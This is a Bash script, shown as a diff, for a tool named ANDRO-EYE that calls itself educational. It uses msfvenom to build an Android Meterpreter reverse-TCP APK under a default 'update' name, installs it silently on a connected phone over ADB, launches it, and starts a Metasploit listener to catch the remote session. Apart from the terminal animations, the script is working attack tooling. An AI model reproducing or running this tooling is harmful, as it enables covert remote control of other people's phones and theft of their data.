@@ -1,0 +1,503 @@
+#!/bin/bash
+# Written in Bash
+# "ONLY FOR EDUCATIONAL PURPOSE"
+# METASPLOIT PAYLOAD GENERATOR - ANDRO-EYE
+
+# Color codes
+RED='\033[0;91m'
+GREEN='\033[0;92m'
+YELLOW='\033[0;93m'
+BLUE='\033[0;94m'
+PURPLE='\033[0;95m'
+CYAN='\033[0;96m'
+WHITE='\033[0;97m'
+NC='\033[0m' # No Color
+BOLD='\033[1m'
+UNDERLINE='\033[4m'
+BLINK='\033[5m'
+
+# Animation functions
+loading_animation() {
+    local message=$1
+    local chars="⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
+    
+    echo -ne "${CYAN}${BOLD}$message ${NC}"
+    for i in {1..20}; do
+        for char in $(echo $chars | grep -o .); do
+            echo -ne "${YELLOW}${BOLD}$char${NC}"
+            sleep 0.05
+            echo -ne "\b"
+        done
+    done
+    echo -e "${GREEN}${BOLD} Done! ${NC}"
+}
+
+progress_bar() {
+    local duration=$1
+    local message=$2
+    
+    echo -ne "${BLUE}${BOLD}$message ${NC}"
+    for i in {1..30}; do
+        echo -ne "${GREEN}${BOLD}▓${NC}"
+        sleep $(echo "scale=2; $duration/30" | bc 2>/dev/null || echo "0.05")
+    done
+    echo -e "${GREEN}${BOLD} Complete! ${NC}"
+}
+
+sparkle_effect() {
+    echo -ne "${YELLOW}"
+    for i in {1..20}; do
+        echo -ne "✦"
+        sleep 0.03
+    done
+    echo -e "${NC}"
+}
+
+pulse_message() {
+    local message=$1
+    local color=$2
+    
+    for i in {1..3}; do
+        echo -ne "${color}${BOLD}$message${NC}"
+        sleep 0.3
+        echo -ne "\r"
+        for j in $(seq 1 ${#message}); do
+            echo -n " "
+        done
+        echo -ne "\r"
+        sleep 0.3
+    done
+    echo -e "${color}${BOLD}$message${NC}"
+}
+
+typewriter_effect() {
+    local text=$1
+    local color=$2
+    for ((i=0; i<${#text}; i++)); do
+        echo -ne "${color}${BOLD}${text:$i:1}${NC}"
+        sleep 0.03
+    done
+    echo
+}
+
+# Function to display device in a box
+display_device_box() {
+    local number=$1
+    local device=$2
+    local model=$3
+    
+    echo -e "${YELLOW}${BOLD}┌──────────────────────────────────────────────┐${NC}"
+    echo -e "${YELLOW}${BOLD}│${NC}  ${GREEN}${BOLD}Device ${number}:${NC}                                        ${YELLOW}│${NC}"
+    echo -e "${YELLOW}${BOLD}│${NC}      ${CYAN}ID:${NC} ${WHITE}$device${NC}              ${YELLOW}│${NC}"
+    echo -e "${YELLOW}${BOLD}│${NC}      ${PURPLE}Model:${NC} ${WHITE}$model${NC}                                 ${YELLOW}│${NC}"
+    echo -e "${YELLOW}${BOLD}└──────────────────────────────────────────────┘${NC}"
+}
+
+# Check for Metasploit
+if ! which msfvenom > /dev/null; then
+    pulse_message "❌ Metasploit Framework not found!" "${RED}"
+    echo -e "${YELLOW}Please install Metasploit first using the main installer${NC}"
+    sleep 3
+    exit 1
+fi
+
+# Create necessary directories
+mkdir -p .temp metasploit 2>/dev/null
+
+# Clear screen and show banner
+clear
+echo -e "${RED}${BOLD}"
+cat << "EOF"
+    ╔═══════════════════════════════════════════════════════════════════╗
+    ║  ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗         ║
+    ║  ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗        ║
+    ║  ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║        ║
+    ║  ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║        ║
+    ║  ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝        ║
+    ║  ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝         ║
+    ║                                                               ║
+    ║              🔥 ${GREEN}PAYLOAD GENERATOR${RED} - ${CYAN}Metasploit Edition${RED}             ║
+    ║                                                               ║
+    ╚═══════════════════════════════════════════════════════════════════╝
+EOF
+echo -e "${NC}"
+sparkle_effect
+
+## DEVICE ID EXTRACT ##
+echo -e "\n${PURPLE}${BOLD}🔎 Scanning for connected devices...${NC}"
+loading_animation "Detecting devices"
+
+adb devices | sed -n '2,$p' | awk '{ print $1 }' > .temp/dev_list_temp 2>/dev/null
+
+# Check if adb command succeeded
+if [ $? -ne 0 ]; then
+    pulse_message "⚠️  ADB command failed! Is ADB installed?" "${RED}"
+    sleep 2
+    exit 1
+fi
+
+# Read devices into array properly
+mapfile -t dev < .temp/dev_list_temp 2>/dev/null
+
+# Fix: Properly assign device variables with null checking
+dev_1="${dev[0]:-}"
+dev_2="${dev[1]:-}"
+dev_3="${dev[2]:-}"
+
+## DEVICE MODEL EXTRACT ##
+adb devices -l | grep "model:" > .temp/dev_list_model_temp 2>/dev/null
+
+# Extract models properly
+mod_1=""
+mod_2=""
+mod_3=""
+
+if [ -s ".temp/dev_list_model_temp" ]; then
+    mapfile -t model_lines < .temp/dev_list_model_temp
+    
+    for i in "${!model_lines[@]}"; do
+        model=$(echo "${model_lines[$i]}" | grep -o 'model:[^ ]*' | cut -d':' -f2)
+        
+        case $i in
+            0) mod_1="$model" ;;
+            1) mod_2="$model" ;;
+            2) mod_3="$model" ;;
+        esac
+    done
+fi
+
+# Fix: Proper device count logic
+total_dev=0
+[ -n "$dev_1" ] && total_dev=1
+[ -n "$dev_2" ] && total_dev=2
+[ -n "$dev_3" ] && total_dev=3
+
+# Display devices
+echo -e "\n${GREEN}${BOLD}✅ Scan Complete!${NC}\n"
+
+if [ "$total_dev" -eq 0 ]; then
+    echo -e "${RED}${BOLD}┌──────────────────────────────────────────────┐${NC}"
+    echo -e "${RED}${BOLD}│${NC}  ${RED}${BLINK}⚠️${NC}  ${WHITE}NO DEVICE CONNECTED${NC}                       ${RED}${BOLD}│${NC}"
+    echo -e "${RED}${BOLD}└──────────────────────────────────────────────┘${NC}"
+    sleep 3
+    bash modules/function2.sh
+    exit 0
+fi
+
+# Input functions with validation
+lhost_taker() {
+    while true; do
+        echo -ne "\n${CYAN}${BOLD}🌐 Enter LHOST (IP address)${NC} ${WHITE}➤${NC} ${YELLOW}"
+        read lhost1
+        echo -ne "${NC}"
+        
+        if [ -z "$lhost1" ]; then
+            pulse_message "❌ IP address cannot be empty!" "${RED}"
+        elif ! [[ $lhost1 =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+            pulse_message "❌ Invalid IP address format!" "${RED}"
+        else
+            break
+        fi
+    done
+}
+
+lport_taker() {
+    while true; do
+        echo -ne "\n${PURPLE}${BOLD}🔌 Enter LPORT (1-65535)${NC} ${WHITE}➤${NC} ${YELLOW}"
+        read lport1
+        echo -ne "${NC}"
+        
+        if [ -z "$lport1" ]; then
+            pulse_message "❌ Port number cannot be empty!" "${RED}"
+        elif ! [[ $lport1 =~ ^[0-9]+$ ]] || [ $lport1 -lt 1 ] || [ $lport1 -gt 65535 ]; then
+            pulse_message "❌ Invalid port number! Must be 1-65535" "${RED}"
+        else
+            break
+        fi
+    done
+}
+
+name_taker() {
+    echo -ne "\n${BLUE}${BOLD}📝 Enter payload name (without .apk)${NC} ${WHITE}➤${NC} ${YELLOW}"
+    read name_apk
+    echo -ne "${NC}"
+    
+    if [ -z "$name_apk" ]; then
+        time=$(date +"%H-%M-%S")
+        name_apk="update-$time"
+        echo -e "${YELLOW}${BOLD}📌 Using default name: ${GREEN}$name_apk${NC}"
+    fi
+}
+
+payload_creator() {
+    echo -e "\n${PURPLE}${BOLD}⚡ Generating payload...${NC}"
+    progress_bar 3 "Creating malicious APK"
+    
+    # Create metasploit directory if it doesn't exist
+    mkdir -p metasploit
+    
+    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost1 LPORT=$lport1 -o "metasploit/$name_apk.apk" > /dev/null 2>&1
+    
+    if [ $? -eq 0 ]; then
+        echo -e "\n${GREEN}${BOLD}✅ Payload created successfully!${NC}"
+        echo -e "${CYAN}${BOLD}📁 Location: ${WHITE}$PWD/metasploit/$name_apk.apk${NC}"
+        
+        # Get file size
+        size=$(du -h "metasploit/$name_apk.apk" | cut -f1)
+        echo -e "${CYAN}${BOLD}📦 Size: ${WHITE}$size${NC}"
+        to_install=0
+    else
+        pulse_message "❌ Failed to create payload!" "${RED}"
+        exit 1
+    fi
+}
+
+apk_install() {
+    echo -e "\n${BLUE}${BOLD}📲 Installing payload on device...${NC}"
+    progress_bar 2 "Installing APK"
+    
+    adb -s $devv install -r "metasploit/$name_apk.apk" > /dev/null 2>&1
+    
+    if [ $? -eq 0 ]; then
+        echo -e "\n${GREEN}${BOLD}✅ Successfully installed on ${WHITE}$modd${NC}"
+        sparkle_effect
+    else
+        echo -e "\n${RED}${BOLD}❌ Failed to install on ${WHITE}$modd${NC}"
+    fi
+}
+
+start_listner() {
+    echo -e "\n${RED}${BOLD}🎯 Launching payload on device...${NC}"
+    adb -s $devv shell monkey -p com.metasploit.stage -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1
+    echo -e "${GREEN}${BOLD}✓ Payload launched${NC}"
+    
+    echo -e "\n${PURPLE}${BOLD}🎧 Starting Metasploit listener...${NC}"
+    
+    time=$(date +"%H-%M-%S")
+    rc_file="$PWD/metasploit/.listener-$time.rc"
+    
+    cat > "$rc_file" << EOF
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST $lhost1
+set LPORT $lport1
+set ExitOnSession false
+exploit -j
+EOF
+    
+    echo -e "${CYAN}${BOLD}📋 Resource file: ${WHITE}$rc_file${NC}"
+    echo -e "\n${YELLOW}${BOLD}Starting Metasploit console...${NC}\n"
+    sleep 2
+    
+    msfconsole -q -r "$rc_file"
+}
+
+# Device selection and payload creation functions
+dev_1_payload_create() {
+    devv="$dev_1"
+    modd="${mod_1:-Unknown}"
+    
+    echo -e "\n${GREEN}${BOLD}📱 Selected Device:${NC}"
+    display_device_box "1" "$devv" "$modd"
+    
+    lhost_taker
+    lport_taker
+    name_taker
+    payload_creator
+    
+    while true; do
+        echo -ne "\n${YELLOW}${BOLD}❓ Install payload on device? ${WHITE}(Y/n) ${YELLOW}➤ ${RED}"
+        read yn
+        echo -ne "${NC}"
+        
+        case ${yn,,} in
+            n|no)
+                echo -e "${BLUE}${BOLD}⏩ Skipping installation${NC}"
+                break
+                ;;
+            *)
+                apk_install
+                break
+                ;;
+        esac
+    done
+    
+    while true; do
+        echo -ne "\n${YELLOW}${BOLD}❓ Start Metasploit listener? ${WHITE}(Y/n) ${YELLOW}➤ ${RED}"
+        read yn
+        echo -ne "${NC}"
+        
+        case ${yn,,} in
+            n|no)
+                echo -e "${BLUE}${BOLD}⏩ Returning to menu${NC}"
+                bash modules/function2.sh
+                break
+                ;;
+            *)
+                start_listner
+                break
+                ;;
+        esac
+    done
+}
+
+dev_2_payload_create() {
+    devv="$dev_2"
+    modd="${mod_2:-Unknown}"
+    
+    echo -e "\n${GREEN}${BOLD}📱 Selected Device:${NC}"
+    display_device_box "2" "$devv" "$modd"
+    
+    lhost_taker
+    lport_taker
+    name_taker
+    payload_creator
+    
+    while true; do
+        echo -ne "\n${YELLOW}${BOLD}❓ Install payload on device? ${WHITE}(Y/n) ${YELLOW}➤ ${RED}"
+        read yn
+        echo -ne "${NC}"
+        
+        case ${yn,,} in
+            n|no)
+                echo -e "${BLUE}${BOLD}⏩ Skipping installation${NC}"
+                break
+                ;;
+            *)
+                apk_install
+                break
+                ;;
+        esac
+    done
+    
+    while true; do
+        echo -ne "\n${YELLOW}${BOLD}❓ Start Metasploit listener? ${WHITE}(Y/n) ${YELLOW}➤ ${RED}"
+        read yn
+        echo -ne "${NC}"
+        
+        case ${yn,,} in
+            n|no)
+                echo -e "${BLUE}${BOLD}⏩ Returning to menu${NC}"
+                bash modules/function2.sh
+                break
+                ;;
+            *)
+                start_listner
+                break
+                ;;
+        esac
+    done
+}
+
+dev_3_payload_create() {
+    devv="$dev_3"
+    modd="${mod_3:-Unknown}"
+    
+    echo -e "\n${GREEN}${BOLD}📱 Selected Device:${NC}"
+    display_device_box "3" "$devv" "$modd"
+    
+    lhost_taker
+    lport_taker
+    name_taker
+    payload_creator
+    
+    while true; do
+        echo -ne "\n${YELLOW}${BOLD}❓ Install payload on device? ${WHITE}(Y/n) ${YELLOW}➤ ${RED}"
+        read yn
+        echo -ne "${NC}"
+        
+        case ${yn,,} in
+            n|no)
+                echo -e "${BLUE}${BOLD}⏩ Skipping installation${NC}"
+                break
+                ;;
+            *)
+                apk_install
+                break
+                ;;
+        esac
+    done
+    
+    while true; do
+        echo -ne "\n${YELLOW}${BOLD}❓ Start Metasploit listener? ${WHITE}(Y/n) ${YELLOW}➤ ${RED}"
+        read yn
+        echo -ne "${NC}"
+        
+        case ${yn,,} in
+            n|no)
+                echo -e "${BLUE}${BOLD}⏩ Returning to menu${NC}"
+                bash modules/function2.sh
+                break
+                ;;
+            *)
+                start_listner
+                break
+                ;;
+        esac
+    done
+}
+
+# Main device selection logic
+if [ "$total_dev" -eq 0 ]; then
+    echo -e "${RED}${BOLD}❌ No devices connected${NC}"
+    sleep 2
+    bash modules/function2.sh
+    
+elif [ "$total_dev" -eq 1 ]; then
+    dev_1_payload_create
+    
+else
+    echo -e "\n${GREEN}${BOLD}📱 Multiple devices detected:${NC}\n"
+    
+    case $total_dev in
+        2)
+            display_device_box "1" "$dev_1" "${mod_1:-Unknown}"
+            echo
+            display_device_box "2" "$dev_2" "${mod_2:-Unknown}"
+            
+            while true; do
+                echo -ne "\n${YELLOW}${BOLD}🎯 Select device (1-2) ${WHITE}➤ ${RED}"
+                read options
+                echo -ne "${NC}"
+                
+                case $options in
+                    1) dev_1_payload_create; break ;;
+                    2) dev_2_payload_create; break ;;
+                    *) pulse_message "❌ Invalid option! Choose 1 or 2" "${RED}" ;;
+                esac
+            done
+            ;;
+            
+        3)
+            display_device_box "1" "$dev_1" "${mod_1:-Unknown}"
+            echo
+            display_device_box "2" "$dev_2" "${mod_2:-Unknown}"
+            echo
+            display_device_box "3" "$dev_3" "${mod_3:-Unknown}"
+            
+            while true; do
+                echo -ne "\n${YELLOW}${BOLD}🎯 Select device (1-3) ${WHITE}➤ ${RED}"
+                read options
+                echo -ne "${NC}"
+                
+                case $options in
+                    1) dev_1_payload_create; break ;;
+                    2) dev_2_payload_create; break ;;
+                    3) dev_3_payload_create; break ;;
+                    *) pulse_message "❌ Invalid option! Choose 1-3" "${RED}" ;;
+                esac
+            done
+            ;;
+    esac
+fi
+
+# Clean up
+echo -e "\n${YELLOW}${BOLD}🧹 Cleaning up temporary files...${NC}"
+rm -f .temp/dev_list_temp .temp/dev_list_model_temp 2>/dev/null
+
+echo -e "\n${BLUE}${BOLD}────────────────────────────────────────────${NC}"
+echo -ne "${GREEN}${BOLD}Press Enter to continue...${NC}"
+read
+
+clear
+bash modules/function2.sh
